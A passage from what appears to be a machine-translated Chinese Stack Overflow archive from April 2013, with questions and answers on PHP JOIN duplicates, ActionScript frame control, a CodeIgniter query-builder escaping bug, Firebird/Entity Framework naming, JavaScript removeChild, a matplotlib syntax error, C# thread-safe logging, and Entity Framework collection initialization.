telnet.puts("geo fix -122.326 47.633\n") 
```

我不确定是否有对 geo 的响应，但如果您想显示可以使用此表单：

```
telnet.cmd("geo fix -122.326 47.633\n") {|c| print c} 
```

# php - 如何从 Echoed 表中删除重复值？

> ID：16091982
> 
> 赞同：1
> 
> 时间：2013-04-18T19:58:50.320
> 
> 标签：php, join, duplicates

我设法为三个表创建了一个 JOIN 查询，并且可以成功地在一个回显表中回显结果，这是我的代码：

```
<?php 

$sql="SELECT a.product_id, a.Options_id, b.product_name, b.product_price, c.Options_name, c.Price_diff
FROM ProductOptions a
JOIN Products b ON a.product_id = b.product_id
JOIN Options c ON a.Options_id = c.Options_id
ORDER BY product_name DESC";

$result = mysql_query($sql);

if (!$result)

{

echo "An error occurred ".mysql_error();

exit;

}

echo "<table border=1>\n<tr><th></th><th bgcolor=\"#DFE8EC\">Name</th><th>Flavors & Size</th><th bgcolor=\"#DFE8EC\">Price</th><th>Price Difference</th><th bgcolor=\"#DFE8EC\"></th></tr>\n";

while ($line = mysql_fetch_array($result)) {

$name = $line["product_name"];

$price = $line["product_price"];

$options=$line["Options_name"];

$difference=$line["Price_diff"];

echo "<tr><td></td><td bgcolor=\"#DFE8EC\">$name</td><td>$options</td> <td bgcolor=\"#DFE8EC\">£$price</td><td>£$difference</td><td bgcolor=\"#DFE8EC\"></td></tr>\n";

}

echo "</table>\n";

?> 
```

我的表有效，但它显示重复的条目`product_name`，我不知道如何删除它们。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-18T20:02:26.430

您必须在查询中使用[GROUP BY](http://dev.mysql.com/doc/refman/5.1/de/group-by-modifiers.html)子句，如下所示：

```
$sql = "SELECT a.product_id, a.Options_id, b.product_name, b.product_price, c.Options_name, c.Price_diff
        FROM ProductOptions a
        JOIN Products b ON a.product_id = b.product_id
        JOIN Options c ON a.Options_id = c.Options_id
        GROUP BY product_name
        ORDER BY product_name DESC"; 
```

# actionscript-3 - 动作脚本 3：影片剪辑后 gotoAndStop() 的问题

> ID：16091983
> 
> 赞同：0
> 
> 时间：2013-04-18T19:58:52.280
> 
> 标签：actionscript-3, movieclip, goto

单击按钮后，动画开始。然后程序会在动画完成后将您定向到某个帧。

这可能吗？

所以这就是我到目前为止所得到的：一个电影剪辑`movQuizIntro`和第 1 帧中的一个按钮`btnBond`。

```
stop()
movQuizIntro.stop()

btnBond.addEventListener(MouseEvent.CLICK, BondQuiz)
btnReg.addEventListener(MouseEvent.CLICK, Registrering)

function BondQuiz (evt:MouseEvent)
{
    if (currentFrame == 1)
{
    movQuizIntro.alpha = 1
    movQuizIntro.play()
}
} 
```

为了在动画完成后转到第 2 帧，您需要编写什么代码和正确的语法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-18T21:12:57.627

在按钮事件处理程序中：

```
function onClick(e:MouseEvent):void{
   ANIMATION_MC.addEventListener(Event.EXIT_FRAME, onFromeExit);
}

function onFrameExit(e:Event):void {
   if (ANIMATION_MC.currentFrame == SOME_FRAME) {
      ANIMATION_MC.removeEventListener(Event.EXIT_FRAME, onFromeExit);
      TARGET.gotoAndPlay(NEW_FRAME);
   }
} 
```

你也可以在 ANIMATION_MC 上使用 addFrameScript。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-18T21:08:12.317

`
停止（）；movQuizIntr​​o.stop(); int frameCounter=0;

```
btnBond.addEventListener(MouseEvent.CLICK, BondQuiz);
btnReg.addEventListener(MouseEvent.CLICK, Registrering);

function BondQuiz (evt:MouseEvent)
{
if (currentFrame == 1)
{
    movQuizIntro.alpha = 1
    movQuizIntro.play()

movQuizIntro.addEventListener(EventType.ENTER_FRAME, onEnterFrame); 
}

} 

// event handler function, runs every enter frame
private function onEnterFrame(event:Event):Void
{
frameCounter++;
if(frameCounter > movQuizIntro.totalFrames)
{       
    //Place code here because you know the MovieClip finished playings
    //Go to desired frame       
}
} 
```

` 我在编辑器之外编写了这段代码，也没有编译，所以要点在那里，可能有一些小错误。注意：这只是一种快速的方法。如果您想要更可重用/更清洁的东西，那么您需要考虑子类化或替代面向对象的技巧。

# php - sql字符串中的反引号不正确

> ID：16091984
> 
> 赞同：0
> 
> 时间：2013-04-18T19:58:53.543
> 
> 标签：php, sql, codeigniter, activerecord

我正在使用 Jamie Rumbelow 的 MY_Model 并且需要添加一个函数，以便它包含一些额外的数据。

我看到了这篇文章，它帮助我找到了完成此操作所需的内容，但我遇到了 SQL 错误。关于什么是错的任何想法？

> 错误号：1064
> 
> 您的 SQL 语法有错误；检查与您的 MySQL 服务器版本相对应的手册，以获取在 'FROM ( `titles`) JOIN `users`ON附近使用的正确语法`titles`。`creator_id`= `users`。`user_id`' 在第 2 行

```
SELECT CONCAT_WS(' ', `users`.`first_name`, `users`.`last_name)` AS creator FROM (`titles`) JOIN `users` ON `titles`.`creator_id` = `users`.`user_id`

public function with_creator()
{
    $this->db->join('users', 'titles.creator_id = users.user_id');
    $this->db->select("CONCAT_WS(' ', users.first_name, users.last_name) AS creator");

    return $this;
} 
```

当我使用 Jamie 的 MY_Model 时，我使用以下代码。

```
// In controller
$pages = $this->pages->with_creator()->get_all();

// In Model
class Pages_m extends MY_Model 
{
public $_table = 'pages';
public $primary_key = 'page_id';

public function with_creator()
    {
        $this->db->join('users', 'pages.creator_id = users.user_id');
        $this->db->select("CONCAT_WS(' ', users.first_name, users.last_name) AS creator", FALSE);

        return $this;
    }
} 
```

它现在只包括创建索引，不包括来自页面本身的任何数据。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-18T20:40:35.577

这是 CodeIgniter 的活动记录/查询构建器本身的一个错误。它与 Jamie 的基本模型无关。发生该错误是因为字符串使用, 以逗号作为分隔符`SELECT`进行分解。`explode()`由于函数中有逗号，因此在某些情况下会产生一些错误。

你有两个选择：

1.  手动编写查询。您不必*一直*使用查询构建器，尤其是当您只针对单一类型的数据库时（查询构建器的一大特点是让您的应用程序与 DB 无关）。

2.  告诉查询生成器不要逃避该特定`SELECT`调用。您可以通过两种方式做到这一点：

数组语法：

```
$this->db->select(array("CONCAT_WS(' ', users.first_name, users.last_name) AS creator")); 
```

转义参数：

```
$this->db->select("CONCAT_WS(' ', users.first_name, users.last_name) AS creator", FALSE); 
```

这个错误应该在 CI 3.0 稳定后得到纠正。它还没有在开发版中修复，但问题是已知的，它只需要解决和合并。如果你有任何反馈，[你可以在这里贡献](https://github.com/EllisLab/CodeIgniter/pull/1612)。

**选择问题：**查询只返回你的`creator`concat 结果，因为这就是你所要求的。该`get_all()`方法不会自动选择所有内容，这只是查询生成器的标准默认设置。一旦你指定了一个`select()`调用，它就会使用它而不是默认的`*`.

您应该修改`select()`（或添加另一个）以确保正确调用其他列。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-18T20:03:55.660

您的查询在错误的地方有一个反引号。像这样修复：

```
SELECT CONCAT_WS(' ', `users`.`first_name`, `users`.`last_name`) AS creator 
FROM (`titles`) JOIN `users` ON `titles`.`creator_id` = `users`.`user_id` 
```

# entity-framework - Firebird / Entity Framework 外键名称

> ID：16091985
> 
> 赞同：4
> 
> 时间：2013-04-18T19:58:54.903
> 
> 标签：entity-framework, firebird

使用 Firebird .NET 提供程序和实体框架（代码优先），外键名称似乎符合以下约定：

FK_MyNetClassName1_MyNetClassName2

这使得超过 Firebird 的 30 个字符限制变得非常容易。有没有办法控制外键名称？（它们可以基于我更短的表名而不是类名吗？那么它们也将是大写的！）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T06:19:20.367

你不能直接改变它。名称创建在提供程序中（当前）是硬编码的。但是您可以让代码生成脚本并将其更改为您想要的任何内容。

# c# - 通过查找 到转发器，然后访问 dataItem

> ID：16091987
> 
> 赞同：0
> 
> 时间：2013-04-18T19:59:05.167
> 
> 标签：c#, linq, repeater

我有一个博客列表，我想按年份对它们进行分组

```
var data = Controller.Blog.GetBlogs().GroupBy(x => x.Year); 
```

分组后，我需要将数据绑定到中继器以读取年份，然后将内容绑定到我使用的嵌套中继器

```
var data = e.Item.DataItem; 
```

但我不知道该投什么。我尝试了很多选择，但没有任何效果。我可能以错误的方式解决问题，所以如果我是，请指出我正确的方向。

# javascript - Javascript removeChild 函数返回 TypeError：值不是对象

> ID：16091994
> 
> 赞同：4
> 
> 时间：2013-04-18T19:59:42.167
> 
> 标签：javascript, html, removechild

我在javascript中创建了一个函数，它检查ID为#stage的div元素是否有任何子节点，如果有，它会在调用函数时删除它们。

当我启动网站时，Firebug 向我返回一个错误，如下所示： TypeError: Value not an object。

这是我的代码：在 javascript 中声明变量阶段：

```
var stage = document.querySelector("#stage"); 
```

给出错误的javascript函数的一部分：

```
if (stage.hasChildNodes()) {
    for (var f1=0; f1<ROWS * COLUMNS; f1++) {
        stage.removeChild(stage.firstChild);
    }
} 
```

HTML 代码：

```
<body>
    <div id="stage">
    </div>
    <script src="code.js">
    </script>
</body> 
```

我想删除 ID 为“stage”的子节点

请帮我解决这个问题。如果您需要有关我的问题的更多信息，请询问。谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-18T20:04:45.040

如果要删除 childNodes，while 循环更容易

```
var parentElement = document.getElementById('stage');
while (parentElement.hasChildNodes()) {
   parentElement.removeChild(parentElement.lastChild);
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-18T20:07:17.673

我想，你得到了一个错误，因为你只是在运行你的 for 循环，条件与子节点计数不匹配。因此，有可能在实际上没有任何子元素的父元素中获得第一个子元素。因此，parent.FirstChild 将返回 null。实际上 parent.removechild 需要一个 DOM 对象，但您的代码将为该对象提供 null 。这可能是您的问题的一个可能原因。试试这个，

```
while(stage.hasChildNodes()) { 
  stage.removeChild( stage.childNodes[0] );
} 
```

# python - 在 Mac OS X 10.8.3 上导入 pylab 的问题

> ID：16091995
> 
> 赞同：1
> 
> 时间：2013-04-18T19:59:44.013
> 
> 标签：python, numpy, matplotlib, osx-mountain-lion

**导入 pylab 时出现以下错误：**

```
Python 2.7.2 (default, Oct 11 2012, 20:14:37)
[GCC 4.2.1 Compatible Apple Clang 4.0 (tags/Apple/clang-418.0.60)] on darwin
Type "help", "copyright", "credits" or "license" for more information.
>>> import pylab
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/Library/Python/2.7/site-packages/matplotlib-1.3.x-py2.7-macosx-10.8-intel.egg/pylab.py", line 1, in <module>
    from matplotlib.pylab import *
  File "/Library/Python/2.7/site-packages/matplotlib-1.3.x-py2.7-macosx-10.8-intel.egg/matplotlib/pylab.py", line 225, in <module>
    import matplotlib.finance
  File "/Library/Python/2.7/site-packages/matplotlib-1.3.x-py2.7-macosx-10.8-intel.egg/matplotlib/finance.py", line 23, in <module>
    from matplotlib.collections import LineCollection, PolyCollection
  File "/Library/Python/2.7/site-packages/matplotlib-1.3.x-py2.7-macosx-10.8-intel.egg/matplotlib/collections.py", line 23, in <module>
    import matplotlib.backend_bases as backend_bases
  File "/Library/Python/2.7/site-packages/matplotlib-1.3.x-py2.7-macosx-10.8-intel.egg/matplotlib/backend_bases.py", line 50, in <module>
    import matplotlib.textpath as textpath
  File "/Library/Python/2.7/site-packages/matplotlib-1.3.x-py2.7-macosx-10.8-intel.egg/matplotlib/textpath.py", line 11, in <module>
    import matplotlib.font_manager as font_manager
  File "/Library/Python/2.7/site-packages/matplotlib-1.3.x-py2.7-macosx-10.8-intel.egg/matplotlib/font_manager.py", line 1297
    _fc_match_regex = re.compile(rb'\sfile:\s+"([^"]*)"')
                                                       ^
SyntaxError: invalid syntax 
```

使用自制软件安装依赖项

```
brew install freetype
brew install libpng 
```

通过克隆 github repo 并执行以下操作安装 matplotlib 和 numpy：

```
sudo python setup.py build
sudo python setup.py install 
```

非常感谢解决此问题的任何帮助。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-18T20:18:58.403

该文件中存在语法错误。我猜你正在使用开发资源？那`rb`不应该在正则表达式之前出现（它应该`r`在 Python 2.x 中，也许`b`在 Python 3.x 中）。

**更新：**是的。这是错误的提交：

[https://github.com/matplotlib/matplotlib/commit/2415c6200ebdba75a0571d71a4569f18153fff57](https://github.com/matplotlib/matplotlib/commit/2415c6200ebdba75a0571d71a4569f18153fff57)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-18T20:25:47.197

# 三位一体：

```
sudo pip install numpy
sudo pip install matplotlib
sudo pip install scipy 
```

如果您使用 master 编译它运行`sudo brew update`然后：

```
sudo brew install freetype
sudo brew install libpng 
```

然后构建并安装：

```
sudo python setup.py build
sudo python setup.py install 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-18T22:26:44.493

应该是`br`。这将暂时在 matplotlib master 中修复。

# c# - 文件被其他线程占用

> ID：16091996
> 
> 赞同：1
> 
> 时间：2013-04-18T19:59:57.160
> 
> 标签：c#, multithreading

我编写了这个静态日志类来记录许多线程期间的所有状态。有时我得到一个异常，说日志文件（程序正在写入）被占用。似乎其他线程正在同时写入文件。我将所有这些工作都调用到 UI 线程以避免此异常，但它仍然会发生。有什么建议吗？谢谢。

顺便说一句，我知道我可以使用 lock(mLog) 来避免这个问题，但我仍然想知道为什么会这样，UI 线程不应该同时运行 2 个 Log.UpdateLog 函数，对吗？

```
public partial class LogForm : Form
{
    private StringBuilder mLog;

    public LogForm()
    {
        InitializeComponent();

        mLog = new StringBuilder();
    }

    public void Write(string msg, bool save)
    {
        mLog.Insert(0, msg + "\r\n\r\n" + "-----------------------------------------------------------------------" + "\r\n\r\n");

        if (save)
        {
            SaveFile();
        }
    }

    private void SaveFile()
    {
        FileStream file;
        file = new FileStream(Application.StartupPath + @"\LOG.txt", FileMode.Create);
        StreamWriter sw = new StreamWriter(file);
        sw.Write(mLog.ToString());
        sw.Close();
        file.Close();
    }

}

public static class Log
{
    private delegate void mUIInvoke(string msg, bool save);

    private static LogForm mLogForm = new LogForm();

    public static void Write(string msg, bool save)
    {
        msg += "\r\nTIME:" + DateTime.Now.ToShortDateString() + "  " + DateTime.Now.ToShortTimeString();

        if (mLogForm.InvokeRequired)
        {
            mUIInvoke invoke = new mUIInvoke(UpdateLog);
            mLogForm.BeginInvoke(invoke, new object[] { msg, save });
        }
        else
        {
            UpdateLog(msg, save);
        }
    }

    private static void UpdateLog(string msg, bool save)
    {
        mLogForm.Write(msg, save);
    }

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-19T04:42:13.330

这绝对不是实现日志记录的优雅方法，因为您的类中有多个线程。如果您想要更好的设计，则必须将日志记录从表单类中移出，因为日志记录是独立的，线程不应访问“表单”以“记录”使其有意义。

有两种选择。

1.  选择经过测试和证明的日志框架，如[log4net](http://logging.apache.org/log4net/)或[NLog](http://nlog-project.org/)

2.  使此日志记录类独立并创建记录器类的实例（尽管我反对单例类，但主要是单例）并在多个线程之间共享它。文件管理、日志功能等必须单独管理。所有操作都必须使用互斥锁等线程同步机制进行保护。有几种方法可以实现日志框架。这完全取决于你真正需要多少！

除非没什么大不了的或出于学习目的，否则我建议您使用现有的日志记录框架，尤其是在与生产质量代码一起使用时。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-18T20:18:21.110

这是一个理论：您的日志记录表单是通过静态变量访问的。这个变量在第一次访问 Log 类时被初始化，第一次访问可以从非 ui 线程发生。因此，您的表单可以在非 ui 线程上创建，这可能会导致您遇到的问题。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-18T20:10:29.747

这不是 UI 线程的问题。问题（主要）出在 SaveFile 方法中。如果两个不同的线程尝试访问此方法，其中一个可能会发现另一个线程仍在使用该文件。一个简单的锁就可以解决这个问题。

所以想象调用`mLogForm.Write` 它的线程 A 它进入方法并不间断地到达 SaveFile 方法，它打开文件流但此时被中断并且操作系统决定运行线程 B 线程 B 运行并到达相同的 SaveFile 找到被锁定的文件上一个线程挂起

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-19T04:26:30.607

我和我的一位朋友发现了这个问题。这实际上是因为在调用 mLogForm.InvokeRequired 之前从未显示过 mLogForm。如果未显示，则永远不会有 mLogForm 的句柄。如果没有句柄，您将无法以正确的方式调用 mLogForm.InvokeRequired。这意味着即使其他线程调用 Log.Write 也会返回 false，然后我有很多线程运行 UpdateLog 方法，导致了这个问题。为确保您可以对未显示的表单使用调用，请在创建此表单时使用 CreateHandle()。谢谢。

# c# - 最佳方式图像 url 到 Drawing.Image

> ID：16091997
> 
> 赞同：1
> 
> 时间：2013-04-18T20:00:00.357
> 
> 标签：c#, image

将图像从 url 加载到 Drawing.Image 的最佳方法？

我找到了这两种方法，哪一种更好还是有更好的方法？

```
PictureBox pb = new PictureBox();
pb.ImageLocation = "http://lovelypackage.com/wp-content/uploads/2012/02/lovely-package-whatever-wine4.jpg";
Image img = pb.Image; 
```

或者

```
using (WebClient wc = new WebClient())
{
    byte[] bytes = wc.DownloadData("http://lovelypackage.com/wp-content/uploads/2012/02/lovely-package-whatever-wine4.jpg");
    MemoryStream ms = new MemoryStream(bytes);
    Image img = Image.FromStream(ms);
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-18T20:43:30.507

如果您没有在应用程序中使用 PictureBox，我建议您使用第二种方法。我会更进一步，使其成为一种接受`url`字符串并返回`Image`使其可在其他地方重用的方法。此外，您可能希望使用它`DownloadDataAsync`来避免阻塞 UI 线程，尤其是在图像可能需要很长时间才能下载的情况下。

# c#-4.0 - MVC 4 EF5 - 添加子实体错误

> ID：16091998
> 
> 赞同：0
> 
> 时间：2013-04-18T20:00:01.113
> 
> 标签：c#-4.0, asp.net-mvc-4, entity-framework-5

尝试将多个实体级别添加到我的 EF 上下文时，我得到一个**对象引用未设置为对象错误的实例。**

采取以下三级示例类结构：

```
public class Forum
{
    public int ID { get; set; }
    public string Name { get; set; }
    public virtual ICollection<Blog> Blogs { get; set; }
}

public class Blog
{
    public int ID { get; set; }
    public string Name { get; set; }
    public int ForumID { get; set; }
    public virtual Forum Forum { get; set; }
    public virtual ICollection<Post> Posts { get; set; }
}

public class Post
{
    public int ID { get; set; }
    public string Name { get; set; }
    public int BlogID { get; set; }
    public virtual Blog Blog { get; set; }
} 
```

对于给定的论坛，我想添加一个带有新帖子的新博客：

```
Forum MyForum = context.Forums.Find(1);
Blog MyBlog = new Blog { Name = "My New Blog" };
Post MyPost = new Post { Name = "My New Post" };

MyForum.Blogs.Add(MyBlog); // This WORKS

MyBlog.Posts.Add(MyPost);  // This FAILS

context.SaveChanges();     // We never make it this far 
```

我已经尝试了所有可能的订单组合，包括`context.SaveChanges()`在`.Add(MyBlog)`. 似乎令人窒息，因为没有`Blog.ID`用于 for `Post.BlogID`，但 EF 生成临时键值以供在这种情况下使用。

有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-18T21:14:53.230

可以在以下位置找到答案（和根本问题）的提示：

*   [实体框架未初始化集合](https://stackoverflow.com/questions/4526364/entity-framework-uninitialised-collection)
*   [Entity Framework 4.1 Code First - 是否应该初始化多个关系 ICollection](https://stackoverflow.com/questions/5703761/entity-framework-4-1-code-first-should-many-relationship-icollections-be-initi)

“简单”的解决方案是手动初始化 Blog.Posts 集合：

```
Blog MyBlog = new Blog { Name = "My New Post", Posts = new List<Post>() }; 
```

或者，您可以按照 Ladislav 在第二个链接中的建议将此逻辑构建到类构造函数中。

基本上，当您创建一个新对象时，该集合为空且未初始化为 List<>，因此`.Add()`调用失败。Forum.Blogs 集合能够延迟加载，因为它派生自数据库上下文。但是，Blog.Posts 是从头开始创建的，EF 无法帮助您，因此默认情况下该集合为 null。